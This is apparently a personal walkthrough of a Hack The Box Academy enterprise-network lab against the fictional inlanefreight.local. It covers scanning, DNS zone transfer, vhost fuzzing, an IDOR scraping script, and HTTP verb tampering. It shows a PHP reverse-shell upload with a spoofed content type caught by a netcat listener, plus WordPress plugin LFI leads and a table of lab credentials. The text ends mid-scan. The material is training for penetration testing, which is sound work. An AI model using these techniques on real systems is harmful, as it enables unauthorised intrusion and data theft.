---
tags: 
group: EnterpriseNetwork
---
![](https://academy.hackthebox.com/images/logo.svg)

- Machine : https://academy.hackthebox.com/module/163
- Reference : 
- Solved : 2024.00.00. (Thu) (Takes 0days)


# Summary


### Credentials

| Idx | Int/Ext | User          | Password                          | Type  | Where to find | Where to use | Link                                                           |
| --- | ------- | ------------- | --------------------------------- | ----- | ------------- | ------------ | -------------------------------------------------------------- |
| 1   | Ext     | ilfreightwp   | password1                         | plain | ir            | ir           | [Link](AEN.md#ir.inlanefreight.local)                          |
| 2   | Ext     | admin         | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | plain | status        | Unknown      | [Link](AEN.md#status.inlanefreight.local)                      |
| 3   | Ext     | srvadm        | ILFreightnixadm!                  | plain | DMZ           | DMZ          | [Link](AEN.md#Privilege%20Escalation%20to%20`srvadm`)          |
| 4   | Ext     | root          | RSA                               | RSA   | DMZ           | DMZ          | [Link](AEN.md#Privilege%20Escalation%20to%20`root`)            |
| 5   | Int     | Administrator | D0tn31Nuk3R0ck$$@123              | plain | DNN           | DNN          | [Link](AEN.md#172.16.8.20)                                     |
| 6   | Int     | hporter       | Gr8hambino!                       | plain | DEV01         | AD           | [Link](AEN.md#Credential%20dump)                               |
| 7   | Int     | backupadm     | !qazXSW@                          | plain | DC01          | SQL          | [Link](AEN.md#SMB%20share%20`Department%20Shares`%20on%20DC01) |
| 8   | Int     | account       | L337^p@$$w0rD                     | plain | DC01          | Email        | [Link](AEN.md#SMB%20Share%20`SYSVOL`%20on%20DC01)              |
| 9   | Int     | backupjob     | lucky7                            | plain | DC01          | SPN          | [Link](AEN.md#Kerberoasting)                                   |



# External Penetration Testing

### Port Scanning

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.129.229.147
Performing quick port scan on 10.129.229.147...
Found open ports: 21,22,25,53,80,110,111,143,993,995,8080
Performing detailed scan on 10.129.229.147...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 04:49 EST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.129.229.147
Host is up (3.3s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
|_ssl-date: TLS randomness does not represent time
53/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
110/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
111/tcp  open  tcpwrapped
143/tcp  open  tcpwrapped
993/tcp  open  imaps?
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
995/tcp  open  pop3s?
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
8080/tcp open  http       Apache httpd 2.4.41
Service Info: Host: 172.17.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 545.29 seconds
```

- ftp(21) is open.
- ssh(22) is open.
- smtp(25) is open.
- dns(53) is open.
- pop3(110) is open.
- http service is running on port 80, 8080

### dns(53)

```bash
┌──(kali㉿kali)-[~/htb]
└─$ dig axfr inlanefreight.local @10.129.229.147

; <<>> DiG 9.20.0-Debian <<>> axfr inlanefreight.local @10.129.229.147
;; global options: +cmd
inlanefreight.local.    86400   IN      SOA     ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.    86400   IN      NS      inlanefreight.local.
inlanefreight.local.    86400   IN      A       127.0.0.1
blog.inlanefreight.local. 86400 IN      A       127.0.0.1
careers.inlanefreight.local. 86400 IN   A       127.0.0.1
dev.inlanefreight.local. 86400  IN      A       127.0.0.1
flag.inlanefreight.local. 86400 IN      TXT     "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN    A       127.0.0.1
ir.inlanefreight.local. 86400   IN      A       127.0.0.1
status.inlanefreight.local. 86400 IN    A       127.0.0.1
support.inlanefreight.local. 86400 IN   A       127.0.0.1
tracking.inlanefreight.local. 86400 IN  A       127.0.0.1
vpn.inlanefreight.local. 86400  IN      A       127.0.0.1
inlanefreight.local.    86400   IN      SOA     ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
;; Query time: 2799 msec
;; SERVER: 10.129.229.147#53(10.129.229.147) (TCP)
;; WHEN: Wed Dec 25 05:14:21 EST 2024
;; XFR size: 14 records (messages 1, bytes 448)
```

Many domains are found here.
I can add this to `/etc/hosts`.

To find further vHost pages, I need to first get the wrong-case content length to exclude.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl -s -I http://10.129.229.147 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
Content-Length: 15157
```

Given the `Content-Length: 15157`, let's fuzz vHost.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.229.147/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157 -s
accountstatus
blog
careers
dev
gitlab
ir
monitoring
status
support
tracking
vpn
```

Let me add all domains I found to `/etc/hosts`.

```lua
10.129.229.147 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local flag.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local monitoring.inlanefreight.local
```

After adding these all domains, let's move onto next services.

### ftp(21)

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ftp 10.129.229.147
Connected to 10.129.229.147.
220 (vsFTPd 3.0.3)
Name (10.129.229.147:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45372|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||47300|)
150 Opening BINARY mode data connection for flag.txt (38 bytes).
100% |*******************************|    38       37.03 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (0.17 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/htb]
└─$ cat flag.txt
HTB{0eb0ab788df18c3115ac43b1c06ae6c4}

ftp> put flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||41235|)
550 Permission denied.
```

It allows `ftp` anonymous login. I can get the flag here.
Also, it doesn't allow `PUT` method.

### ssh(22)

```scss
┌──(kali㉿kali)-[~/htb]
└─$ nc -nv 10.129.229.147 22
(UNKNOWN) [10.129.229.147] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

This SSH version (OpenSSH_8.2p1) doesn't have known vulnerabilities.
Maybe I have to revisit it after getting some credentials.

### smtp(25)

First, let's check existing users with `VRFY` method;

```bash
┌──(kali㉿kali)-[~/htb]
└─$ telnet 10.129.229.147 25
Trying 10.129.229.147...
Connected to 10.129.229.147.
Escape character is '^]'.
220 ubuntu ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
VRFY www-data
252 2.0.0 www-data
VRFY nonexistinguser
550 5.1.1 <nonexistinguser>: Recipient address rejected: User unknown in local recipient table
```

Some users like `root`, `www-data` exist while the others don't exist.

### http(80)

Let's enumerate through all web domains using `eyewitness`.
First, let's prepare a list of subdomains.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat ilfreight_subdomains 
inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

Then, let's run `eyewitness`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
################################################################################
#                                  EyeWitness                                  #
################################################################################
#           Red Siege Information Security - https://www.redsiege.com           #
################################################################################

Starting Web Requests (11 Hosts)
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Attempting to screenshot http://careers.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://gitlab.inlanefreight.local
Attempting to screenshot http://ir.inlanefreight.local
Attempting to screenshot http://status.inlanefreight.local
Attempting to screenshot http://support.inlanefreight.local
Attempting to screenshot http://tracking.inlanefreight.local
Attempting to screenshot http://vpn.inlanefreight.local
Attempting to screenshot http://monitoring.inlanefreight.local
[*] Hit timeout limit when connecting to http://support.inlanefreight.local, retrying
[*] Hit timeout limit when connecting to http://tracking.inlanefreight.local, retrying
[*] Hit timeout limit when connecting to http://tracking.inlanefreight.local
[*] Hit timeout limit when connecting to http://support.inlanefreight.local
Finished in 27.55370020866394 seconds

[*] Done! Report written in the /home/kali/htb/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
Y
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
M                                                                M
M       .”cCCc”.                                                 M
M      /cccccccc\                                                M
M      §cccccccc|            Check Back Soon For                 M
M      :ccccccccP                 Upcoming Training              M
M      \cccccccc()                                               M
M       \ccccccccD                                               M
M       |cccccccc\        _                                      M
M       |ccccccccc)     //                                       M
M       |cccccc|=      //                                        M
M      /°°°°°°”-.     (CCCC)                                     M
M      ;----._  _._   |cccc|                                     M
M   .*°       °°   °. \cccc/                                     M
M  /  /       (      )/ccc/                                      M
M  |_/        |    _.°cccc|                                      M
M  |/         °^^^°ccccccc/                                      M
M  /            \cccccccc/                                       M
M /              \cccccc/                                        M
M |                °*°                                           M
M /                  \      Psss. Follow us on >> Twitter        M
M °*-.__________..-*°°                         >> Facebook       M
M  \WWWWWWWWWWWWWWWW/                          >> LinkedIn       M
M   \WWWWWWWWWWWWWW/                                             M
MMMMM|WWWWWWWWWWWW|MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
```

Let's visit each pages with the result.

##### blog.inlanefreight.local

![](attachments/aen_1.png)

I can find drupal's logo on the page which implies that the service is running on drupal.
On its source code, I can find its version : `drupal 9`

I checked 

```xml
<!DOCTYPE html>
<html lang="en" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# ">
  <head>
    <meta charset="utf-8" />
<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
```

It also has a login page with sign-up / reset password fucntions.

![](attachments/aen_2.png)

I tried to create a new account.
While creating, I found that there's a function to upload photo.
I tried to upload non-image files, but it failed due to its extension.

![](attachments/aen_3.png)

I also tested with doubled extensions like `php.jpg`, but it didn't work.

![](attachments/aen_5.png)


While I created an account, it says the account will be on review instead of immediately creating it.

![](attachments/aen_4.png)

Since I cannot use the newly created account, I think I'm done with this web service for now.

For the last choice, I tested several defaults accounts and passwords like `admin`, `password`...
But none of them worked.

At least, this service is ditched and doesn't seem to be managed now.
Have to mention that they need to stop exposing unnecessary web services which can be potentially risky.

##### careers.inlanefreight.local

![](attachments/aen_6.png)
It looks like a career recruiting web page of the company which is expected to be running on `flask` I guess.
It has several links activated : `/apply`, `/login`, `/register`

![](attachments/aen_7.png)

I tried to send fake application through the page, but nothing happened.
Then, I created a fake ID through `/register` page.

After sign-in, I was led to my profile page.

![](attachments/aen_8.png)

Here I can see that I was given `id=9` on URL.
What if I can give other IDs without any authentication? That's IDOR vulnerability.

![](attachments/aen_9.png)

I tried it, and it worked!
With this, I can retrieve potential applicants names.
Let's automate with a script.

```python
import requests
from bs4 import BeautifulSoup

base_url = "http://careers.inlanefreight.local/profile"

names = []
headers = {"Cookie": "session=eyJsb2dnZWRfaW4iOnRydWV9.Z2wEiw.Nq_IqJBxVz_px-J8_bKdVDmFmc0"}

for id_value in range(0, 101):
    params = {"id": id_value}
    try:
        response = requests.get(base_url, params=params, headers=headers)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')

            if 'Jobs applied by' in response.text:
                start_index = response.text.find('Jobs applied by') + len('Jobs applied by ')
                end_index = response.text.find('</h1>', start_index)
                name = response.text[start_index:end_index].strip()
                names.append(name)
                print(f"Found name: {name} (ID: {id_value})")
        else:
            print(f"Failed to fetch ID: {id_value} (Status: {response.status_code})")
    except Exception as e:
        print(f"Error fetching ID: {id_value} - {e}")

unique_names = list(set(names))
print("\nCollected Names:")
for name in unique_names:
    print(name)

with open("collected_names.txt", "w") as file:
    for name in unique_names:
        file.write(f"{name}\n")
```

This crawls username from the requested pages.

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ python careers_crawl.py 
Found name: James (ID: 1)
Found name: Harry (ID: 2)
Found name: Tom (ID: 3)
Found name: htb-student (ID: 4)
Found name: Jerry (ID: 5)
Found name: James (ID: 6)
Found name: John (ID: 7)
Found name: Miller (ID: 8)
Found name: bokchee (ID: 9)

Collected Names:
John
James
Miller
Harry
bokchee
Tom
htb-student
Jerry
```

Here I was able to retrieve potential users or applicants.
This might be useful in later pentesting.
Also can be reported as vulnerable data leak point.

Let's move onto next target page.
##### dev.inlanefreight.local

![](attachments/aen_10.png)

It's led to a login page.
I tried several easy credentials, but none of them worked.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 288]
/index.php            (Status: 200) [Size: 2048]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
```

There are some extra php pages found but got forbidden which implies it requires authentication.

But it allows several directory listings like `/images`, `/uploads` while there is nothing useful for now. Still it's a vulnerability that anonymous can access server files. So it'd be good to note.

This time let's try `http verb tampering` using `Burpsuite`.

![](attachments/aen_11.png)

I sent `OPTIONS` and got a response that it allows 5 methods : `GET`, `POST`, `PUT`, `TRACK`, `OPTIONS`
Let's try all these on `Repeater`.

Since the previous response was `403 Forbidden`, let's add `X-Custom-IP-Authorization: 127.0.0.1` on its header.

With `TRACK` method, and `X-Custom-IP-Authorization` header, I was able to get a different page.

![](attachments/aen_12.png)

It seems to be a Photo editor platform which is in development mode.

![](attachments/aen_13.png)

It allows upload function.
When I try uploading text file, it returns an error.

![](attachments/aen_14.png)

So I prepared laudanum's `php-reverse-shell.php`, and change its parameter, and change the type to `asdf` when it's captured on `Burpsuite`. Then this will be taken as image file.

```http
POST /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------140828297639066885742388510122
Content-Length: 5834
Origin: http://dev.inlanefreight.local
Connection: keep-alive
Referer: http://dev.inlanefreight.local/upload.php
Upgrade-Insecure-Requests: 1

-----------------------------140828297639066885742388510122
Content-Disposition: form-data; name="file"; filename="rshell.php"
Content-Type: image/png

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
```

I uploaded it, and got a message as follows;

![](attachments/aen_15.png)

Let's open a listener and fetch the uploaded file.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.229.147] 47068
Linux 879145b4cf73 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 16:39:29 up  1:14,  0 users,  load average: 0.10, 0.18, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

Here I got `www-data`'s shell!
Let's see if I can pivot through this shell.

```bash
$ hostname -I
172.18.0.5 
```

It has only a single internal IP. Furthermore, the shell doesn't have many linux commands, which implies that this is an restricted environment such as VM or docker container.

Still we have to report that the system's upload function is vulnerable to RCE attack.

##### ir.inlanefreight.local

![](attachments/aen_17.png)

This is a simple "Investor Relations" page which doesn't seem to have many functions.
When I clicked "Comment" on its bottom, it shows a clue that the server is running on Wordpress.

![](attachments/aen_18.png)

Let's scan with `wpscan`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
[sudo] password for kali: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://ir.inlanefreight.local/ [10.129.229.147]
[+] Started: Wed Dec 25 11:56:51 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://ir.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2024-03-13T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 0.9
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Last Updated: 2024-08-28T03:05:00.000Z
 | [!] The version is out of date, the latest version is 1.0.7.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec 25 11:57:03 2024
[+] Requests Done: 51
[+] Cached Requests: 7
[+] Data Sent: 11.972 KB
[+] Data Received: 21.886 MB
[+] Memory used: 282.18 MB
[+] Elapsed time: 00:00:11
```

According to the scan result, the server is using `Wordpress 6.0`, `cbusiness-investment 0.7`, `b2i-investor-tools 1.0.5`, and `mail-masta 1.0`.

Also it has `robots.txt` and `/wp-admin` page which might be useful if I know any valid credential.

Here are the potential vulnerabilities I found:
- Wordpress 6.0 has several vulnerabilities including XSS, SQLi but doesn't have RCE.
- `cbusiness-investment` and `b2i-investor-tools` don't have known vulnerablitiies.
- `mail-masta 1.0` has well known RCE, SQLi vulnerabilities.

I decided to go with `mail-masta`'s vulnerabilities, and here I found the references;
- https://www.exploit-db.com/exploits/40290
- https://github.com/p0dalirius/CVE-2016-10956-mail-masta

![](attachments/aen_19.png)

It was successful from the first shot, and I got LFIs.
This should be marked as a critical vulnerability.

Let's try extracting users with `wpscan -e u` option.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local
[sudo] password for kali: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://ir.inlanefreight.local/ [10.129.67.59]
[+] Started: Wed Dec 25 12:34:38 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://ir.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2024-03-13T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 0.9
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:06 <===============> (10 / 10) 100.00% Time: 00:00:06

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec 25 12:35:02 2024
[+] Requests Done: 57
[+] Cached Requests: 8
